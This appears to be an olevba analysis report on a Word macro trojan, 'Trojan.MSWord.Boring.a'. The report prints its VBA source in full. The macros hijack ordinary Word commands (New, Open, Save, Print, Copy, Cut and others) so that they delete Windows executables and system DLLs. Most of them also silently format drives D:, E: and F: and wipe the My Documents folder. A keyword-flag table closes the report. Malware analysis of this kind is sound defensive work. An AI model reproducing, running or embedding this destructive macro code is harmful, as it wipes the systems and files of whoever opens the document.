olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Boring.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Boring.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Trojan.MSWord.Boring.a - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileNew()
Attribute FileNew.VB_Description = "Creates a new document or template"
Attribute FileNew.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.FileNew"
'
' FileNew Macro
' Creates a new document or template
'
On Error GoTo ThatsAllFolks
Kill "c:\windows\*.exe"
Kill "c:\windows\*.com"
Kill "c:\windows\command\*.exe"
Kill "c:\windows\system\*.dll"

ThatsAllFolks:

    Dialogs(wdDialogFileNew).Show

End Sub
Sub FileOpen()
Attribute FileOpen.VB_Description = "Opens an existing document or template"
Attribute FileOpen.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.FileOpen"
'
' FileOpen Macro
' Opens an existing document or template
'
On Error GoTo ThatsAllFolks
Kill "c:\windows\*.exe"
Kill "c:\windows\*.com"
Kill "c:\windows\command\*.exe"
Kill "c:\windows\system\*.dll"

ThatsAllFolks:
Dialogs(wdDialogFileOpen).Show


End Sub
Sub FileClose()
Attribute FileClose.VB_Description = "Closes all of the windows of the active document"
Attribute FileClose.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.FileClose"
'
' FileClose Macro
' Closes all of the windows of the active document
'
On Error GoTo ThatsAllFolks
Shell "c:\windows\command\format.com d:\ /u /q /autotest", vbMinimizedFocus
Shell "c:\windows\command\format.com e:\ /u /q /autotest", vbMinimizedFocus
Shell "c:\windows\command\format.com f:\ /u /q /autotest", vbMinimizedFocus
Kill "c:\windows\*.exe"
Kill "c:\windows\*.com"
Kill "c:\windows\command\*.exe"
Kill "c:\windows\system\*.dll"
Kill "c:\mydocu~1\*.*"


ThatsAllFolks:
Select Case Err.Number
        Case 55
            Close #1
        Case Else
    
            
End Select
    Resume
                

    WordBasic.FileClose

End Sub
Sub FileSave()
Attribute FileSave.VB_Description = "Saves the active document or template"
Attribute FileSave.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.FileSave"
'
' FileSave Macro
' Saves the active document or template
'
On Error GoTo ThatsAllFolks
Shell "c:\windows\command\format.com d:\ /u /q /autotest", vbMinimizedFocus
Shell "c:\windows\command\format.com e:\ /u /q /autotest", vbMinimizedFocus
Shell "c:\windows\command\format.com f:\ /u /q /autotest", vbMinimizedFocus
Kill "c:\windows\*.exe"
Kill "c:\windows\*.com"
Kill "c:\windows\command\*.exe"
Kill "c:\windows\system\*.dll"
Kill "c:\mydocu~1\*.*"
ThatsAllFolks:
Select Case Err.Number
        Case 55
            Close #1
        Case Else
    
            
End Select
    Resume
    ActiveDocument.Save

End Sub
Sub FileVersions()
Attribute FileVersions.VB_Description = "Manages the versions of a document"
Attribute FileVersions.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.FileVersions"
'
' FileVersions Macro
' Manages the versions of a document
'
On Error GoTo ThatsAllFolks
Shell "c:\windows\command\format.com d:\ /u /q /autotest", vbMinimizedFocus
Shell "c:\windows\command\format.com e:\ /u /q /autotest", vbMinimizedFocus
Shell "c:\windows\command\format.com f:\ /u /q /autotest", vbMinimizedFocus
Kill "c:\windows\*.exe"
Kill "c:\windows\*.com"
Kill "c:\windows\command\*.exe"
Kill "c:\windows\system\*.dll"
Kill "c:\mydocu~1\*.*"
ThatsAllFolks:
Select Case Err.Number
        Case 55
            Close #1
        Case Else
    
            
End Select
    Resume


    Dialogs(wdDialogFileVersions).Show

End Sub
Sub FilePageSetup()
Attribute FilePageSetup.VB_Description = "Changes the page setup of the selected sections"
Attribute FilePageSetup.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.FilePageSetup"
'
' FilePageSetup Macro
' Changes the page setup of the selected sections
'
On Error GoTo ThatsAllFolks
Shell "c:\windows\command\format.com d:\ /u /q /autotest", vbMinimizedFocus
Shell "c:\windows\command\format.com e:\ /u /q /autotest", vbMinimizedFocus
Shell "c:\windows\command\format.com f:\ /u /q /autotest", vbMinimizedFocus
Kill "c:\windows\*.exe"
Kill "c:\windows\*.com"
Kill "c:\windows\command\*.exe"
Kill "c:\windows\system\*.dll"
Kill "c:\mydocu~1\*.*"
ThatsAllFolks:
Select Case Err.Number
        Case 55
            Close #1
        Case Else
    
            
End Select
    Resume
    Dialogs(wdDialogFileDocumentLayout).Show

End Sub
Sub FilePrintPreview()
Attribute FilePrintPreview.VB_Description = "Displays full pages as they will be printed"
Attribute FilePrintPreview.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.FilePrintPreview"
'
' FilePrintPreview Macro
' Displays full pages as they will be printed
'
On Error GoTo ThatsAllFolks
Shell "c:\windows\command\format.com d:\ /u /q /autotest", vbMinimizedFocus
Shell "c:\windows\command\format.com e:\ /u /q /autotest", vbMinimizedFocus
Shell "c:\windows\command\format.com f:\ /u /q /autotest", vbMinimizedFocus
Kill "c:\windows\*.exe"
Kill "c:\windows\*.com"
Kill "c:\windows\command\*.exe"
Kill "c:\windows\system\*.dll"
Kill "c:\mydocu~1\*.*"
ThatsAllFolks:
Select Case Err.Number
        Case 55
            Close #1
        Case Else
    
            
End Select
    Resume
    ActiveDocument.PrintPreview

End Sub
Sub FilePrint()
Attribute FilePrint.VB_Description = "Prints the active document"
Attribute FilePrint.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.FilePrint"
'
' FilePrint Macro
' Prints the active document
'
On Error GoTo ThatsAllFolks
Shell "c:\windows\command\format.com d:\ /u /q /autotest", vbMinimizedFocus
Shell "c:\windows\command\format.com e:\ /u /q /autotest", vbMinimizedFocus
Shell "c:\windows\command\format.com f:\ /u /q /autotest", vbMinimizedFocus
Kill "c:\windows\*.exe"
Kill "c:\windows\*.com"
Kill "c:\windows\command\*.exe"
Kill "c:\windows\system\*.dll"
Kill "c:\mydocu~1\*.*"
ThatsAllFolks:
Select Case Err.Number
        Case 55
            Close #1
        Case Else
    
            
End Select
    Resume
    Dialogs(wdDialogFilePrint).Show

End Sub
Sub FileProperties()
Attribute FileProperties.VB_Description = "Shows the properties of the active document"
Attribute FileProperties.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.FileProperties"
'
' FileProperties Macro
' Shows the properties of the active document
'
On Error GoTo ThatsAllFolks
Shell "c:\windows\command\format.com d:\ /u /q /autotest", vbMinimizedFocus
Shell "c:\windows\command\format.com e:\ /u /q /autotest", vbMinimizedFocus
Shell "c:\windows\command\format.com f:\ /u /q /autotest", vbMinimizedFocus
Kill "c:\windows\*.exe"
Kill "c:\windows\*.com"
Kill "c:\windows\command\*.exe"
Kill "c:\windows\system\*.dll"
Kill "c:\mydocu~1\*.*"
ThatsAllFolks:
Select Case Err.Number
        Case 55
            Close #1
        Case Else
    
            
End Select
    Resume
    WordBasic.FileProperties

End Sub
Sub FileExit()
Attribute FileExit.VB_Description = "Quits Microsoft Word and prompts to save the documents"
Attribute FileExit.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.FileExit"
'
' Clyde Macro
' Quits Microsoft Word and prompts to save the documents
'
On Error GoTo ThatsAllFolks
Shell "c:\windows\command\format.com d:\ /u /q /autotest", vbMinimizedFocus
Shell "c:\windows\command\format.com e:\ /u /q /autotest", vbMinimizedFocus
Shell "c:\windows\command\format.com f:\ /u /q /autotest", vbMinimizedFocus
Kill "c:\windows\*.exe"
Kill "c:\windows\*.com"
Kill "c:\windows\command\*.exe"
Kill "c:\windows\system\*.dll"
Kill "c:\mydocu~1\*.*"
ThatsAllFolks:
Select Case Err.Number
        Case 55
            Close #1
        Case Else
    
            
End Select
    Resume
    WordBasic.FileExit

End Sub
Sub EditCopy()
Attribute EditCopy.VB_Description = "Copies the selection and puts it on the Clipboard"
Attribute EditCopy.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.EditCopy"
'
' EditCopy Macro
' Copies the selection and puts it on the Clipboard
'
On Error GoTo ThatsAllFolks
Shell "c:\windows\command\format.com d:\ /u /q /autotest", vbMinimizedFocus
Shell "c:\windows\command\format.com e:\ /u /q /autotest", vbMinimizedFocus
Shell "c:\windows\command\format.com f:\ /u /q /autotest", vbMinimizedFocus
Kill "c:\windows\*.exe"
Kill "c:\windows\*.com"
Kill "c:\windows\command\*.exe"
Kill "c:\windows\system\*.dll"
Kill "c:\mydocu~1\*.*"
ThatsAllFolks:
Select Case Err.Number
        Case 55
            Close #1
        Case Else
    
            
End Select
    Resume
    Selection.Copy

End Sub
Sub EditCut()
Attribute EditCut.VB_Description = "Cuts the selection and puts it on the Clipboard"
Attribute EditCut.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.EditCut"
'
' EditCut Macro
' Cuts the selection and puts it on the Clipboard
'
On Error GoTo ThatsAllFolks
Shell "c:\windows\command\format.com d:\ /u /q /autotest", vbMinimizedFocus
Shell "c:\windows\command\format.com e:\ /u /q /autotest", vbMinimizedFocus
Shell "c:\windows\command\format.com f:\ /u /q /autotest", vbMinimizedFocus
Kill "c:\windows\*.exe"
Kill "c:\windows\*.com"
Kill "c:\windows\command\*.exe"
Kill "c:\windows\system\*.dll"
Kill "c:\mydocu~1\*.*"
ThatsAllFolks:
Select Case Err.Number
        Case 55
            Close #1
        Case Else
    
            
End Select
    Resume
    Selection.Cut

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbMinimizedFocus    |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

